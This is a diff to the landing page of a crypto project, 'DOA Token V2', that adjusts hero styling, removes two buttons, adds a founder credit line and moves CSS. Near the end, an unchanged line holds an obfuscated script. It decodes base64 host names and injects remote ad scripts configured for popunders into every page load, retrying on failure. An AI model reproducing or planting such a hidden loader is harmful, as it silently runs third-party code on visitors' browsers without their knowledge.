@@ -5,7 +5,7 @@ permalink: /
 ---
 
 <!-- Hero Institucional DOA Token V2 -->
-<section style="padding:64px 16px;text-align:center;position:relative;
+<section style="padding:32px 16px;text-align:center;position:relative;
                 background:linear-gradient(180deg,#000000 0%,#1a1a1a 100%);
                 color:#FFD700;font-family:'Montserrat',sans-serif;overflow:hidden">
 
@@ -14,22 +14,57 @@ permalink: /
        class="watermark-logo">
 
   <div style="position:relative;z-index:1">
-    <h1 style="margin:0 0 12px;font-size:2.4em;font-weight:800;letter-spacing:-0.02em">
+    <h1 style="margin:0 0 8px;font-size:2.2em;font-weight:800;letter-spacing:-0.02em">
       DOA Token V2
     </h1>
-    <p style="margin:10px 0 24px;font-size:1.2em;font-weight:500;color:#FFD700">
+    <p style="margin:8px 0 16px;font-size:1.1em;font-weight:500;color:#FFD700">
       Verified • Transparent • Community Driven
     </p>
-
-    <!-- CTA dual -->
-    <div style="display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-bottom:32px">
-      <a href="/docs/" style="background:#FFD700;color:#000;padding:12px 18px;border-radius:10px;
-                              font-weight:700;text-decoration:none">Ver documentación</a>
-      <a href="/community/" style="background:#333;color:#FFD700;padding:12px 18px;border-radius:10px;
-                                  font-weight:700;text-decoration:none">Entrar a la comunidad</a>
-    </div>
   </div>
 </section>
+
+<style>
+  .founder-info {
+    margin-top: 16px;
+    font-size: 0.95em;
+    color: #FFD700;
+    font-weight: 600;
+    text-align: center;
+  }
+  @media (max-width: 768px) {
+    .founder-info {
+      font-size: 0.85em;
+    }
+  }
+  @media (max-width: 480px) {
+    .founder-info {
+      font-size: 0.75em;
+    }
+  }
+  .watermark-logo {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    opacity: 0.05;
+    width: 70%;
+    max-width: 900px;
+    z-index: 0;
+    pointer-events: none;
+  }
+  @media (max-width: 768px) {
+    .watermark-logo {
+      width: 90%;
+      max-width: 500px;
+    }
+  }
+  @media (max-width: 480px) {
+    .watermark-logo {
+      width: 100%;
+      max-width: 320px;
+    }
+  }
+</style>
 
 ---
 
@@ -82,6 +117,11 @@ Seleccione su idioma / Select your language:
   </a>
 </p>
 
+<!-- Información del fundador debajo de Comunidad Oficial -->
+<div class="founder-info">
+  Fundador: Angel R. Linares (ALIMGUZ) • Fundador único, responsable de arquitectura técnica, cumplimiento, comunidad y operaciones
+</div>
+
 ---
 
 <div style="display:flex;gap:16px;justify-content:center;flex-wrap:wrap;margin-top:32px;color:#94a3b8;font-size:14px">
@@ -101,30 +141,3 @@ Seleccione su idioma / Select your language:
 (function(){var k=window,m="d30821c03f80282ac46bbccfd6ee5e68",v=[["siteId",595*305-843-24+5091385],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],q=["d3d3LmJldHRlcmFkc3lzdGVtLmNvbS9oaW1naXgtY29yZS1qcy5jc3M=","ZDJrazBvM2ZyN2VkMDEuY2xvdWRmcm9udC5uZXQvUnAvcXNwbGl0Lm1pbi5qcw=="],d=-1,y,c,g=function(){clearTimeout(c);d++;if(q[d]&&!(1795402065000<(new Date).getTime()&&1<d)){y=k.document.createElement("script");y.type="text/javascript";y.async=!0;var b=k.document.getElementsByTagName("script")[0];y.src="https://"+atob(q[d]);y.crossOrigin="anonymous";y.onerror=g;y.onload=function(){clearTimeout(c);k[m.slice(0,16)+m.slice(0,16)]||g()};c=setTimeout(g,5E3);b.parentNode.insertBefore(y,b)}};if(!k[m]){try{Object.freeze(k[m]=v)}catch(e){}g()}})();
 /*]]>/* */
 </script>
-
-<!-- CSS adicional para responsividad del logo -->
-<style>
-  .watermark-logo {
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    opacity: 0.05;
-    width: 70%;
-    max-width: 900px;
-    z-index: 0;
-    pointer-events: none;
-  }
-  @media (max-width: 768px) {
-    .watermark-logo {
-      width: 90%;
-      max-width: 500px;
-    }
-  }
-  @media (max-width: 480px) {
-    .watermark-logo {
-      width: 100%;
-      max-width: 320px;
-    }
-  }
-</style>
